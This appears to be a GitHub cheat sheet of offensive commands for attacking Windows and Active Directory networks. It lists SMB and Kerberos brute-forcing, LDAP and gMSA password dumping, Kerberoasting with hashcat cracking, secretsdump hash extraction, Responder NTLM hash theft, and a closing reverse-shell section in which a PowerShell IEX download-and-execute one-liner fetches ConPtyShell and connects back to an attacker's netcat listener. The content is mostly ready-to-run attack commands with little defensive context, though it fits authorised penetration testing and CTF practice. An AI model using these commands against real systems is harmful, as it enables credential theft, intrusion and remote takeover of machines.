<picture>
    <source height="100px" srcset="https://user-images.githubusercontent.com/22857002/173634314-01b1c385-b279-429b-9144-6ad43cff2d4c.svg#gh-dark-mode-only" media="(prefers-color-scheme: dark)">
    <img height="100px" src="https://user-images.githubusercontent.com/28403617/172732896-97a2e867-7e5a-473d-afd4-c00a0378b7ac.svg#gh-light-mode-only">
</picture>

---
- [DMP File](#dmp-file)
- [Enum4Linux](#enum4linux)
- [Enumeration](#enumeration)
- [Exfiltration](#exfiltration)
- [IMPACKET](#impacket)
- [Kerberos](#kerberos)
- [Ldap](#ldap)
- [MSRPC](#msrpc)
- [Responder](#responder)
- [Reverse shell](#reverse-shell)
- [SMB](#smb)
- [Virus](#virus)
- [WinRM](#winrm)

# Enumeration
## Scripts
### Winpeas
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O
```

### PrivescCheck
> This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post-exploitation.

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

[Github](https://github.com/itm4n/PrivescCheck)

# Enum4Linux
> Enum4linux is a tool for enumerating information from Windows and Samba systems.

### List Users
```bash
enum4linux -U ip
```

### Blank user
```bash
enum4linux -a -u '' -p '' ip
```

### With User
```bash
enum4linux -a -u user -p password ip
```

# SMB
> *Port: 445*
>
> SMB/Samba is a popular freeware program that allows users to access and use files, printers, and other commonly shared resources.

### Nmap
```bash
nmap -p 445 --script smb-os-discovery ip
```

### List Share
```bash
smbclient -L ip -U user
```
```bash
smbclient -L ip --no-pass
```

### Connect
```bash
smbclient '//ip/SHARE' --no-pass
```
```bash
smbclient '//ip/SHARE' -U user%password
```

### SmbMap
```bash
smbmap -H ip -u anonymous
smbmap -u user -p pass -H ip
```

### Bruteforce
```bash
crackmapexec smb ip -u users.txt -p password.txt
```

### Bruteforce users
```bash
crackmapexec smb -u 'user' -p 'pass' ip --rid-brute 
```

# MSRPC
> *Port: 135*
> 
> "MSRPC is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network." · [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)

### Connect
```bash
rpcclient ip -U user -L -h

rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> enumdomains
rpcclient $> getdompwinfo
rpcclient $> enumprivs
```

### List Services
```
services.py user:password@987@ip list
```
```
rpcdump.py user:password@987@ip
```

> [IOXIDResolver](https://raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py) is used for remote enumeration of network interfaces
```
python IOXIDResolver.py -t IP
```

[*Impacket Docs*](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

# WinRM
> *Port: 5985 / 5986*
> 
> Windows Remote Management (WinRM) is a feature that allows administrators to remotely run management scripts, execute command, monitor and manage windows system remote computers and servers. 

### Connect with powershell
```bash
evil-winrm -i ip -u user -p password
evil-winrm -i ip -c certi.crt -k decrypted.key -p -u -S
```

# Kerberos
> *Port: 88*
> 
> Kerberos is an authentication protocol that is used to verify the identity of a user or host.

### Bruteforce User
```bash
kerbrute userenum -d domain --dc ip user.txt
```

### Get user ticket
> Checking if Kerberos pre-authentication has been disabled for accounts
```
GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip DOMAIN/
```

### Enumusers
> With msfconsole we have able to list users form wordlists of users.

```
msf6 auxiliary(gather/kerberos_enumusers)
```

- [Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

# Ldap
> *Port: 389, 636*
> 
> Lightweight directory access protocol (LDAP) is a protocol that makes it possible for applications to query user information rapidly.

### Nmap
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 ip
```

### Ldapsearch
```
ldapsearch -x -h IP -b DC=EXAMPLE,DC=COM
```

### Ldapdomaindump
> [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) is a tool for gathering information of ldap. (you need to have creds of an user to use it)

```
ldapdomaindump IP -u 'DOMAIN\USER' -p PASSWORD --no-json --no-grep
```

### gMSADumper
> [gMSADumper](https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py) read the gMSA (group managed service accounts) password of the account.

```
python gMSADumper.py -u USER -p PASSWORD -d DOMAIN
```

# IMPACKET
### GetUserSPNs
> [GetUserSPNs](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py) find Service Principal Names that are associated with normal user account, and exfiltrate the kerberos.

```
python GetUserSPNs.py -dc-ip IP -outputfile KERBEROS_FILE_OUTPUT -request -debug <DOMAIN>/<USER>

hashcat -m 13100 --force -a 0 KERBEROS_FILE /usr/share/wordlists/rockyou.txt
```

# Responder
> Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.  
> Basicaly a rogue everything use for exemple to steal NLTLM Hash, usernames...  [source](https://github.com/lgandx/Responder)

Server (attacker) :
```bash
python Responder.py -I interface
```

Client (victim):
```powershell
gci \\ip\test\test
```

### GetNPUsers
> [GetNPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/GetNPUsers.py) will attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set.

```
python GetNPUsers.py -usersfile USER_LIST_FILE -no-pass -dc-ip IP DOMAIN/
```

### secretsdump
> [secretsdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/impacket_0_10_0/examples/secretsdump.py) dumping Active Directory Password Hashes.

```
python secretsdump.py -just-dc-ntlm DOMAIN/USER@DOMAIN_CONTROLLER
python secretsdump.py DOMAIN/USER:PASSWORD@IP
```

# Exfiltration
### Certificate
```powershell
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

### Download file
```powershell
Invoke-WebRequest -Uri http://example.com -OutFile file.out
```

# DMP File
### Extract
```bash
Foremost file.dmp
```

### Volatility
```
vol -f memory.dmp scan_name | tee output_scan
```

### Bulk Extractor
```bash
bulk_extractor -o bulk_output memory.dmp
```

# Virus
### Virus Total
> Analyse suspicious files, domains, IPs and URLs to detect malware and other breaches, automatically share them with the security community. 
>
> VirusTotal aggregates many antivirus products and online scan engines called Contributors

- [VirusTotal Site](https://www.virustotal.com/gui/home/upload)

### Cobalt Strike
- [Cobalt Strike: Using Known Private Keys To Decrypt Traffic – Part 1](https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/)
- [Cobalt Strike: Using Known Private Keys To Decrypt Traffic – Part 2](https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/)
- [Cobalt Strike: Using Process Memory To Decrypt Traffic – Part 3](https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/)

# Reverse shell
### ConPtyShell
> ConPtyShell is a Fully Interactive Reverse Shell for Windows systems. *[source](https://github.com/antonioCoco/ConPtyShell)*

#### Server :
```bash
stty raw -echo; (stty size; cat) | nc -lvnp port
```

#### Client with internet access: 
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ip port
```
*without create shell.ps1, paste the Invoke-ConPtyShell.ps1, add `Invoke-ConPtyShell ip port` on a new line*

Interactive Windows cheatsheet : [Wadcoms](https://wadcoms.github.io/)